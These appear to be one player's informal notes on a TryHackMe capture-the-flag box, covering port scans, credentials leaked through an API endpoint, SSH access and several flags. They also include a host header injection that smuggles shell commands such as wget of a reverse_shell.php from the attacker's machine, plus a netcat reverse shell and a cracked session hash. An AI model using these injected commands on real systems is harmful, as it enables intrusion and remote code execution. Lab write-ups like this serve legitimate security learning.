target: 10.10.235.176
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
81/tcp   open  hosts2-ns
82/tcp   open  xfer
2222/tcp open  EtherNetIP-1
8888/tcp open  sun-answerbook
9999/tcp open  abyss

second scan :
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 59e0ae23cc5ff949ae146483dec6908d (RSA)
|   256 75e22d236c28e1235add7a5a32d8f378 (ECDSA)
|_  256 63ef9f631437d6ccb01b2687e56fb60e (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-title: Server Manager Login
|_Requested resource was /login
|_http-server-header: Apache/2.4.41 (Ubuntu)
81/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Home Page
82/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: I Love Hills - Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4f939a3f4bcc7791e3c4e26793fb9879 (RSA)
|   256 00f95e658674d82de18d62f67dbea707 (ECDSA)
|_  256 01a0a53c2e5e02fef5d28add4c441a2b (ED25519)
8888/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.8.5)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: Werkzeug/0.16.0 Python/3.8.5
9999/tcp open  abyss?
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Fri, 08 Sep 2023 19:25:08 GMT
|     Content-Length: 0
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Date: Fri, 08 Sep 2023 19:25:06 GMT
|_    Content-Length: 0


There is many website's and 2 ssh port
I visited the http://10.10.235.176:8888 port 8888 and i found : Welcome to CMNatic's Application Launcher! You can launch applications by enumerting the /apps/ endpoint. 
then i entered the /apps and it's return me :
{"app1": {"name": "online file storage"}, "app2": {"name": "media player"}, "app3": {"name": "file sync"}, "app4": {"name": "/users"}}
I see here i /users and i found this {"user": {"davelarkin": "totallysecurehuh"}}
i think it's a user and his password. i will try it on these two ssh
on the 1st port it's not work 
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.235.176' (ED25519) to the list of known hosts.
davelarkin@10.10.235.176: Permission denied (publickey).
I will try in the second: Uhh on the port 2222 it's works
davelarkin@a9ef0531077f:~$ ls
api  bin  container4_flag.txt
davelarkin@a9ef0531077f:~$ cat container4_flag.txt
THM{831dbd19214cb7ed6eb3881f67b4734b}

Privilege escalation:
I used linpeas but nothing

I visited then the port 81 and i opened my burp 
also the thing i learn today is the host header injection and  that i can replace the host and change it by my host.
I opened a python server and i replace the host in burp using mine.
found https://infosecwriteups.com/identifying-escalating-http-host-header-injection-attacks-7586d0ff2c67
To discover it i added 
GET /product/1 HTTP/1.1
Host: 10.10.235.176:81
Host: 10.8.128.36
I got 400
Now i added a line
GET /product/1 HTTP/1.1
 Host: 10.10.235.176:81
Host: 10.8.128.36
and got 500 error

GET /product/1 HTTP/1.1
Host: 10.8.128.36
And i got this : ┌──(root㉿kali)-[/home/…/CTFs/Boot2root/koth/pwnkit]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.235.176 - - [08/Sep/2023 15:56:16] code 404, message File not found
10.10.235.176 - - [08/Sep/2023 15:56:16] "GET /api/product/1 HTTP/1.1" 404 -

I tried this :
GET /product/1 HTTP/1.1
Host: 10.8.128.36/reverse_shell.php
but not work
Let's deep on it
I added my IP on it
GET / HTTP/1.1
Host: 10.8.128.36:1337
┌──(root㉿kali)-[/home/kali/CTFs/Boot2root/koth]
└─# nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.128.36] from (UNKNOWN) [10.10.253.64] 58672
GET /api/product HTTP/1.1
Host: 10.8.128.36:1337
User-Agent: curl/7.68.0
Accept: */*

I tried GET / HTTP/1.1
Host: 10.8.128.36:1337;wget 10.8.128.36:1337;
┌──(root㉿kali)-[/home/kali/CTFs/Boot2root/koth]
└─# nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.128.36] from (UNKNOWN) [10.10.253.64] 58690
GET / HTTP/1.1
Host: 10.8.128.36:1337
User-Agent: curl/7.68.0
Accept: */*

But when i try to ad /shell.php it's not work
GET / HTTP/1.1
Host: 10.8.128.36:1337;wget 10.8.128.36:1337/reverse_shell.php
Now i will move the shell.php into index.html
Then i will move index.html into shell.php
and here is the response 
┌──(root㉿kali)-[/home/kali/CTFs/tryhackme]
└─# python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.10.253.64 - - [09/Sep/2023 09:40:17] "GET / HTTP/1.1" 200 -
10.10.253.64 - - [09/Sep/2023 09:40:18] "GET / HTTP/1.1" 200 -

Now i move :
GET / HTTP/1.1
Host: 10.8.128.36:1337;mv index.html shell.php;
Then i just need to go in http://10.10.253.64:81/shell.php
and nc -lnvp 1337 to get a shell

$ cat container2_flag.txt
THM{882128b1c0051c8351e79d28d5c93167}
admin : pass: niceWorkHackerm4n

PrivEsc:
-rwxrwxr-x 1 root     root       88 Feb 21  2021 /startup.sh
/usr/share/openssh/sshd_config

╔══════════╣ Unexpected in root
/.dockerenv
/startup.sh



port 80
10.10.253.64/api/user/
ffuf on it                         [Status: 401, Size: 52, Words: 9, Lines: 1]
login                   [Status: 200, Size: 53, Words: 3, Lines: 1]
session                 [Status: 200, Size: 91, Words: 1, Lines: 1]

on session i found {"active_sessions":[{"id":1,"username":"admin","hash":"1b4237f476826986da63022a76c35bb1"}]}
1b4237f476826986da63022a76c35bb1:dQw4w9WgXcQ